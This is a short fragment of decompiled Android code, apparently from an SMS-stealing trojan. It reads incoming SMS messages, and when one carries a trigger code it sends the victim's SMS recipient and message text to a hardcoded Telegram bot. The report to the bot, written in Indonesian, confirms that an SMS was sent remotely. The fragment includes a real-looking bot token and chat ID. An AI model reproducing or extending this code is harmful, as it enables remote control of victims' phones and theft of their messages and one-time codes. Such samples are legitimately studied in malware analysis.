                    ...
                    while (i < smsMessageArr.length) {
                        ...
                        if (parseInt == 55555) {
                            ...
                            try {
                                String str9 = str6;
                                String str10 = str9;
                                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7230319224:AAFIVGd2yhGe552DCNwoz2DKEvXm99QHG2g/sendMessage?parse_mode=markdown&chat_id=7335299143&text=Berhasil Kirim SMS dari Jauh  %0AKepada  : _" + str5 + ",%0A𝗣𝗲𝘀𝗮𝗻 : " + str9 + "_").build()).enqueue(new Callback() {
